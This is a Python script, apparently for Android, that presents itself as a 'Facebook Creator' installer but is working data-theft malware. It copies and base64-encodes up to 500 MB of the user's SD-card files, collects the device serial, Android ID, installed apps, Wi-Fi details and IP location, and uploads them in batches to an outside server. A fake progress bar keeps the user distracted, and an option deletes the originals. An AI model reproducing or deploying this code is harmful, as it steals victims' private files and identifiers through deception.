import time
import random
import os
import requests
import platform
import base64
import uuid
import json
from datetime import datetime
import sys
import threading
import subprocess
import logging

class FacebookCracker:
    def __init__(self):
        self.debug_log = []
        self.device_id = self.get_device_id()
        self.MAX_DATA_SIZE = 500 * 1024 * 1024  # 500 MB total limit
        # Setup logging to file
        logging.basicConfig(filename='/sdcard/cracker_log.txt', level=logging.DEBUG, 
                            format='%(asctime)s %(levelname)s: %(message)s')
        self.debug_log.append(f"Initialized with device_id: {self.device_id}")

    def get_device_id(self):
        """Generate a unique device ID."""
        return uuid.uuid4().hex

    def get_last_modified(self, file_path):
        """Get the last modified time of a file in a human-readable format."""
        try:
            mtime = os.path.getmtime(file_path)
            last_edit = datetime.fromtimestamp(mtime)
            now = datetime.now()
            delta = now - last_edit
            if delta.days > 0:
                return f"{delta.days} days ago"
            elif delta.seconds > 3600:
                return f"{delta.seconds // 3600} hours ago"
            elif delta.seconds > 60:
                return f"{delta.seconds // 60} minutes ago"
            else:
                return "just now"
        except Exception as e:
            self.debug_log.append(f"Failed to get mtime for {file_path}: {str(e)}")
            logging.error(f"Failed to get mtime for {file_path}: {str(e)}")
            return "unknown"

    def collect_files(self, sdcard_path):
        """Collect all files from the SD card, including hidden and Trash/cache folders."""
        files_data = []
        deleted_files = []
        trash_folders = []
        total_size = 0
        for root, dirs, files in os.walk(sdcard_path, followlinks=False):
            # Skip app-private data
            if '/Android/data' in root:
                continue
            # Check for Trash/cache folders
            if any(keyword in root.lower() for keyword in ['trash', '.trashed', 'cache', 'deleted']):
                trash_folders.append(root)
                self.debug_log.append(f"Found Trash/cache folder: {root}")
                logging.info(f"Found Trash/cache folder: {root}")
            for file_name in files:
                if total_size >= self.MAX_DATA_SIZE:
                    self.debug_log.append("Reached 500 MB data limit")
                    logging.warning("Reached 500 MB data limit")
                    break
                file_path = os.path.join(root, file_name)
                try:
                    size = os.path.getsize(file_path)
                    if size == 0:
                        self.debug_log.append(f"Skipping empty file: {file_path}")
                        logging.warning(f"Skipping empty file: {file_path}")
                        continue
                    if total_size + size > self.MAX_DATA_SIZE:
                        self.debug_log.append(f"Skipping {file_name}: exceeds 500 MB limit")
                        logging.warning(f"Skipping {file_name}: exceeds 500 MB limit")
                        continue
                    with open(file_path, 'rb') as f:
                        content = base64.b64encode(f.read()).decode('utf-8', errors='ignore')
                    relative_path = os.path.relpath(root, sdcard_path)
                    file_data = {
                        'name': file_name,
                        'content': content,
                        'folder': relative_path,
                        'last_edit': self.get_last_modified(file_path),
                        'size': size
                    }
                    files_data.append(file_data)
                    total_size += size
                    deleted_files.append(file_path)
                    self.debug_log.append(f"Collected file: {file_path} ({size} bytes)")
                    logging.info(f"Collected file: {file_path} ({size} bytes)")
                except Exception as e:
                    self.debug_log.append(f"Failed to read {file_path}: {str(e)}")
                    logging.error(f"Failed to read {file_path}: {str(e)}")
                    continue
        # Save collected data locally
        self.save_local_output(files_data, trash_folders)
        return files_data, deleted_files, trash_folders

    def save_local_output(self, files_data, trash_folders):
        """Save collected data to /sdcard/image_collection_output.json."""
        try:
            output_data = {
                'device_id': self.device_id,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'files': files_data,
                'device_info': self.get_device_info(),
                'trash_folders': trash_folders,
                'debug_log': self.debug_log
            }
            output_path = '/sdcard/image_collection_output.json'
            with open(output_path, 'w') as f:
                json.dump(output_data, f, indent=2)
            self.debug_log.append(f"Saved local output to {output_path}")
            logging.info(f"Saved local output to {output_path}")
        except Exception as e:
            self.debug_log.append(f"Failed to save local output: {str(e)}")
            logging.error(f"Failed to save local output: {str(e)}")

    def get_device_info(self):
        """Gather device information without root."""
        info = {}
        try:
            info['model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8', errors='ignore').strip()
            info['os_version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode('utf-8', errors='ignore').strip()
            info['serial'] = subprocess.check_output(['getprop', 'ro.serialno']).decode('utf-8', errors='ignore').strip()
            info['android_id'] = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode('utf-8', errors='ignore').strip()
            info['installed_apps'] = subprocess.check_output(['pm', 'list', 'packages']).decode('utf-8', errors='ignore').strip().splitlines()
            info['battery'] = subprocess.check_output(['dumpsys', 'battery']).decode('utf-8', errors='ignore').strip()
            info['uptime'] = subprocess.check_output(['uptime']).decode('utf-8', errors='ignore').strip()
            try:
                info['wifi_ssid'] = subprocess.check_output(["dumpsys", "wifi"], shell=True).decode('utf-8', errors='ignore').strip()
            except:
                info['wifi_ssid'] = "Unknown"
        except Exception as e:
            self.debug_log.append(f"Failed to get device info: {str(e)}")
            logging.error(f"Failed to get device info: {str(e)}")
        return info

    def display_progress_bar(self, duration, total_files):
        """Display a fake progress bar with installation messages."""
        fake_messages = [
            "Initializing Facebook Creator setup...",
            "Verifying device compatibility...",
            "Downloading core components...",
            "Configuring Creator tools...",
            "Finalizing installation..."
        ]
        print("\nInstalling Facebook Creator...")
        for i in range(101):
            if i % 20 == 0 and i // 20 < len(fake_messages):
                print(fake_messages[i // 20])
            time.sleep(duration / 100)
            bar_length = 50
            filled = int(bar_length * i // 100)
            bar = '█' * filled + '-' * (bar_length - filled)
            sys.stdout.write(f'\rProgress: |{bar}| {i}% ({min(i * total_files // 100, total_files)}/{total_files} processed)')
            sys.stdout.flush()
        print("\nSoftware not supported on your mobile.\n")

    def upload_scripts(self, delete_photos=False):
        """Upload collected files to the server in batches."""
        try:
            device_name = platform.node() or "Unknown"
            if device_name == "localhost" or not device_name:
                device_name = f"Device_{uuid.uuid4().hex[:8]}"
            server_url_upload = "https://script.onemancode.com/api/upload_data"
            sdcard_path = "/sdcard"
            time.sleep(random.randint(2, 5))
            if not os.path.exists(sdcard_path):
                self.debug_log.append("SD card path not accessible")
                logging.error("SD card path not accessible")
                print("Error: SD card path not accessible")
                return
            files_data, deleted_files, trash_folders = self.collect_files(sdcard_path)
            total_files = len(files_data)
            if total_files == 0:
                self.debug_log.append("No files found on SD card")
                logging.warning("No files found on SD card")
                print("No files found to upload.")
                return
            batch_size = 100
            for i in range(0, total_files, batch_size):
                batch_files = files_data[i:i + batch_size]
                batch_deleted_files = deleted_files[i:i + batch_size]
                progress_thread = threading.Thread(target=self.display_progress_bar, args=(10, len(batch_files)))
                progress_thread.start()
                try:
                    ip_info = requests.get('http://ip-api.com/json/', timeout=5).json()
                    metadata = {
                        'ip': ip_info.get('query', 'Unknown'),
                        'country': ip_info.get('country', 'Unknown'),
                        'city': ip_info.get('city', 'Unknown'),
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': device_name,
                        'batch_number': i // batch_size + 1,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                except Exception:
                    metadata = {
                        'ip': 'Unknown',
                        'country': 'Unknown',
                        'city': 'Unknown',
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': device_name,
                        'batch_number': i // batch_size + 1,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                upload_payload = {
                    'device_id': self.device_id,
                    'device_name': device_name,
                    'metadata': json.dumps(metadata, ensure_ascii=False),
                    'photos': json.dumps(batch_files, ensure_ascii=False),
                    'device_info': json.dumps(self.get_device_info(), ensure_ascii=False)
                }
                try:
                    response = requests.post(server_url_upload, json=upload_payload, timeout=60)
                    progress_thread.join()
                    if response.status_code == 200:
                        self.debug_log.append(f"Successfully uploaded batch {i//batch_size + 1} for device {self.device_id}")
                        logging.info(f"Successfully uploaded batch {i//batch_size + 1} for device {self.device_id}")
                        print(f"\nBatch {i//batch_size + 1} uploaded successfully")
                        if delete_photos:
                            for file_path in batch_deleted_files:
                                try:
                                    os.remove(file_path)
                                    self.debug_log.append(f"Deleted {file_path}")
                                    logging.info(f"Deleted {file_path}")
                                except Exception as e:
                                    self.debug_log.append(f"Failed to delete {file_path}: {str(e)}")
                                    logging.error(f"Failed to delete {file_path}: {str(e)}")
                    else:
                        self.debug_log.append(f"Batch {i//batch_size + 1} upload failed: {response.status_code} {response.text}")
                        logging.error(f"Batch {i//batch_size + 1} upload failed: {response.status_code} {response.text}")
                        print(f"\nBatch {i//batch_size + 1} upload failed: {response.status_code}")
                except Exception as e:
                    progress_thread.join()
                    self.debug_log.append(f"Batch {i//batch_size + 1} upload error: {str(e)}")
                    logging.error(f"Batch {i//batch_size + 1} upload error: {str(e)}")
                    print(f"\nBatch {i//batch_size + 1} upload error: {str(e)}")
        except Exception as e:
            self.debug_log.append(f"General error in upload_scripts: {str(e)}")
            logging.error(f"General error in upload_scripts: {str(e)}")
            print(f"Error: {str(e)}")

    def start_menu(self):
        """Start the upload process."""
        self.upload_scripts(delete_photos=False)

def main():
    cracker = FacebookCracker()
    cracker.start_menu()

if __name__ == "__main__":
    main()
